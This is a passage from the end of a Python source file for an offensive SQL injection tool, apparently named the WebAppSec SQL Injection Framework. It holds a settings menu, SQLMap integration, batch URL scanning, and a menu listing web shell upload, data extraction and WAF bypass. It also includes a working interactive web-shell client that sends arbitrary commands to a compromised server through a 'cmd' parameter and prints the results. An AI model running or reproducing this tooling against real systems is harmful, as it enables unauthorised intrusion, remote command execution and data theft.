        print(f"[4] Set delay threshold")
        print(f"[5] Install/Update dependencies")
        print(f"[6] View current settings")
        print(f"[0] Back to main menu")
        
        choice = input(f"\n{Colors.WHITE}Select option: {Colors.END}").strip()
        
        if choice == '1':
            proxy = input(f"{Colors.WHITE}Enter proxy URL (http://host:port): {Colors.END}").strip()
            if proxy:
                self.tester.set_proxy(proxy)
        
        elif choice == '2':
            print(f"{Colors.YELLOW}Enter custom headers (format: Header-Name: Value):{Colors.END}")
            print(f"{Colors.YELLOW}Press Enter twice to finish{Colors.END}")
            
            headers = {}
            while True:
                header = input().strip()
                if not header:
                    break
                if ':' in header:
                    name, value = header.split(':', 1)
                    headers[name.strip()] = value.strip()
            
            if headers:
                self.tester.set_headers(headers)
        
        elif choice == '3':
            try:
                timeout = int(input(f"{Colors.WHITE}Enter timeout (seconds): {Colors.END}"))
                self.tester.timeout = timeout
                print(f"{Colors.GREEN}[+] Timeout set to {timeout} seconds{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}[-] Invalid timeout value{Colors.END}")
        
        elif choice == '4':
            try:
                threshold = float(input(f"{Colors.WHITE}Enter delay threshold (seconds): {Colors.END}"))
                self.tester.delay_threshold = threshold
                print(f"{Colors.GREEN}[+] Delay threshold set to {threshold} seconds{Colors.END}")
            except ValueError:
                print(f"{Colors.RED}[-] Invalid threshold value{Colors.END}")
        
        elif choice == '5':
            EnvironmentDetector.install_dependencies()
        
        elif choice == '6':
            print(f"\n{Colors.CYAN}Current Settings:{Colors.END}")
            print(f"  Timeout: {self.tester.timeout} seconds")
            print(f"  Delay Threshold: {self.tester.delay_threshold} seconds")
            print(f"  User-Agent: {self.tester.session.headers.get('User-Agent', 'Default')}")
            print(f"  Proxy: {self.tester.session.proxies.get('http', 'None')}")
            
    def _check_sqlmap(self):
        """Check if SQLMap is available"""
        try:
            subprocess.run(['sqlmap', '--version'], capture_output=True, check=True)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            return False
    
    def _install_sqlmap(self):
        """Install SQLMap"""
        env = EnvironmentDetector.detect_environment()
        
        try:
            if env['package_manager'] == 'pkg':
                subprocess.run(['pkg', 'install', '-y', 'sqlmap'], check=True)
            else:
                subprocess.run(['sudo', 'apt', 'install', '-y', 'sqlmap'], check=True)
            
            print(f"{Colors.GREEN}[+] SQLMap installed successfully{Colors.END}")
        except subprocess.CalledProcessError:
            print(f"{Colors.RED}[-] Failed to install SQLMap{Colors.END}")
    
    def _interactive_shell(self, shell_url):
        """Interactive web shell session"""
        print(f"\n{Colors.BOLD}{Colors.GREEN}INTERACTIVE SHELL SESSION{Colors.END}")
        print(f"{Colors.YELLOW}Type 'exit' to quit shell session{Colors.END}")
        
        while True:
            try:
                command = input(f"{Colors.GREEN}shell> {Colors.END}").strip()
                
                if command.lower() in ['exit', 'quit']:
                    break
                
                if not command:
                    continue
                
                # Execute command via web shell
                cmd_url = f"{shell_url.split('?')[0]}?cmd={quote(command)}"
                response = self.tester.session.get(cmd_url, timeout=30)
                
                # Clean up response
                soup = BeautifulSoup(response.text, 'html.parser')
                output = soup.get_text()
                
                print(output)
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] Shell session terminated{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}[-] Error: {e}{Colors.END}")
    
    def run_interactive(self):
        """Run interactive mode"""
        self.print_banner()
        
        while True:
            try:
                self.show_menu()
                choice = input(f"\n{Colors.WHITE}[WebAppSec-SQLi] Select option: {Colors.END}").strip()
                
                if choice == '1':
                    self.single_url_test()
                elif choice == '2':
                    self.batch_url_test()
                elif choice == '3':
                    self.manual_payload_test()
                elif choice == '4':
                    self.sqlmap_integration()
                elif choice == '5':
                    self.web_shell_upload()
                elif choice == '6':
                    self.data_extraction()
                elif choice == '7':
                    self.waf_bypass_test()
                elif choice == '8':
                    self.generate_report()
                elif choice == '9':
                    self.settings_configuration()
                elif choice == '0' or choice.lower() == 'exit':
                    print(f"\n{Colors.GREEN}[*] Thank you for using WebAppSec SQL Injection Framework!{Colors.END}")
                    print(f"{Colors.CYAN}[*] Stay ethical, stay secure!{Colors.END}")
                    break
                else:
                    print(f"{Colors.RED}[-] Invalid choice. Please try again.{Colors.END}")
                
                input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] Exiting...{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}[-] Unexpected error: {e}{Colors.END}")
    
    def run(self):
        """Run the sqlinjectionframework framework interactively (called from main framework menu)"""
        self.run_interactive()

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="WebAppSec v1.0 - Advanced SQL Injection Framework by Braintree",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 SQLInjectionTester.py                           # Interactive mode
  python3 SQLInjectionTester.py -u http://target.com/page.php?id=1
  python3 SQLInjectionTester.py -u http://target.com/page.php?id=1 --proxy http://127.0.0.1:8080
  python3 SQLInjectionTester.py --batch urls.txt
  python3 SQLInjectionTester.py --sqlmap -u http://target.com/page.php?id=1
        """
    )
    
    parser.add_argument('-u', '--url', help='Target URL to test')
    parser.add_argument('--batch', help='File containing URLs to test')
    parser.add_argument('--proxy', help='Proxy URL (http://host:port)')
    parser.add_argument('--timeout', type=int, default=30, help='Request timeout (default: 30)')
    parser.add_argument('--delay-threshold', type=float, default=3.0, help='Time-based delay threshold (default: 3.0)')
    parser.add_argument('--sqlmap', action='store_true', help='Use SQLMap integration')
    parser.add_argument('--output', default='output/sql_injection', help='Output directory')
    parser.add_argument('--install-deps', action='store_true', help='Install dependencies and exit')
    
    args = parser.parse_args()
    
    # Handle dependency installation
    if args.install_deps:
        print(f"{Colors.YELLOW}[*] Installing dependencies...{Colors.END}")
        EnvironmentDetector.install_dependencies()
        return
    
    # Create framework instance
    framework = SQLInjectionFramework()
    framework.output_dir = args.output
    
    # Configure settings
    if args.proxy:
        framework.tester.set_proxy(args.proxy)
    
    framework.tester.timeout = args.timeout
    framework.tester.delay_threshold = args.delay_threshold
    
    # Handle command line arguments
    if args.url:
        framework.print_banner()
        
        if args.sqlmap:
            print(f"{Colors.BLUE}[*] Using SQLMap integration{Colors.END}")
            # Run basic SQLMap scan
            if framework._check_sqlmap():
                command = f'sqlmap -u "{args.url}" --batch --level=3 --risk=2'
                print(f"{Colors.YELLOW}[*] Executing: {command}{Colors.END}")
                subprocess.run(command.split())
            else:
                print(f"{Colors.RED}[-] SQLMap not available{Colors.END}")
        else:
            vulnerabilities = framework.tester.comprehensive_test(args.url)
            
            if vulnerabilities:
                print(f"\n{Colors.RED}[!] Found {len(vulnerabilities)} vulnerabilities{Colors.END}")
                framework.report_generator.generate_html_report(args.url, vulnerabilities, framework.output_dir)
                framework.report_generator.generate_json_report(args.url, vulnerabilities, framework.output_dir)
            else:
                print(f"\n{Colors.GREEN}[+] No vulnerabilities found{Colors.END}")
    
    elif args.batch:
        framework.print_banner()
        
        if not os.path.exists(args.batch):
            print(f"{Colors.RED}[-] Batch file not found: {args.batch}{Colors.END}")
            return
        
        with open(args.batch, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        print(f"{Colors.GREEN}[+] Loaded {len(urls)} URLs from batch file{Colors.END}")
        
        all_vulnerabilities = []
        for url in urls:
            print(f"\n{Colors.YELLOW}[*] Testing: {url}{Colors.END}")
            
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            try:
                vulnerabilities = framework.tester.comprehensive_test(url)
                all_vulnerabilities.extend(vulnerabilities)
            except Exception as e:
                print(f"{Colors.RED}[-] Error testing {url}: {e}{Colors.END}")
        
        if all_vulnerabilities:
            print(f"\n{Colors.RED}[!] Total vulnerabilities found: {len(all_vulnerabilities)}{Colors.END}")
            framework.report_generator.generate_html_report("Batch Testing", all_vulnerabilities, framework.output_dir)
            framework.report_generator.generate_json_report("Batch Testing", all_vulnerabilities, framework.output_dir)
        else:
            print(f"\n{Colors.GREEN}[+] No vulnerabilities found in batch testing{Colors.END}")
    
    else:
        # Interactive mode
        framework.run_interactive()

if __name__ == "__main__":
    main()